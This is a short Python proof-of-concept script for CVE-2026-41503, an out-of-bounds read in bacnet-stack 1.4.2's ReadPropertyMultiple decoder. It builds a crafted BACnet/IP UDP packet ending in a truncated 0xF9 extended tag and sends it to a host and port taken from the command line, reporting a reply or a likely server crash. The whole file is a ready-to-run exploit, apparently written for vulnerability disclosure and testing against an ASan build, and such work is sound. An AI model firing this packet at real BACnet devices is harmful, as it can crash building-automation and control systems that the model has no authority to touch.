#!/usr/bin/env python3
"""
CVE-2026-41503 PoC - bacnet-stack 1.4.2 OOB read in
rpm_decode_object_property() (src/bacnet/rpm.c).

A ReadPropertyMultiple request with a valid object id followed by a property body
of a single 0xF9 extended-tag marker makes the property decoder call the
deprecated decode_tag_number_and_value(), which reads apdu[1] one byte past the
received PDU. Under the ASan moving-fence build this aborts in decode_tag_number
via decode_tag_number_and_value -> rpm_decode_object_property.

Usage: python3 bacnet_cve_2026_41503_real_poc.py [host] [port]
"""
import socket
import struct
import sys

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 47808


def build_packet() -> bytes:
    # Object id (context tag 0 + 4-byte object id) + opening tag 1 (0x1E) for the
    # list-of-property-references, then a single 0xF9 (extended tag, length octet
    # missing) so rpm_decode_object_property over-reads apdu[1].
    obj = bytes([0x0C, 0x02, 0x00, 0x00, 0x01, 0x1E])
    prop = bytes([0xF9])
    apdu = bytes([0x00, 0x05, 0x01, 0x0E]) + obj + prop
    npdu = bytes([0x01, 0x04])  # version 1, control: expecting-reply
    body = npdu + apdu
    bvlc = bytes([0x81, 0x0A]) + struct.pack(">H", 4 + len(body))  # Original-Unicast-NPDU
    return bvlc + body


def main() -> None:
    pkt = build_packet()
    print(f"[*] CVE-2026-41503 -> {host}:{port} ({len(pkt)} B) {pkt.hex()}")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(pkt, (host, port))
    try:
        s.settimeout(2)
        print("[*] reply:", s.recvfrom(1500)[0].hex())
    except socket.timeout:
        print("[*] no reply (server crashed - check `docker logs` for ASan abort)")
    finally:
        s.close()


if __name__ == "__main__":
    main()
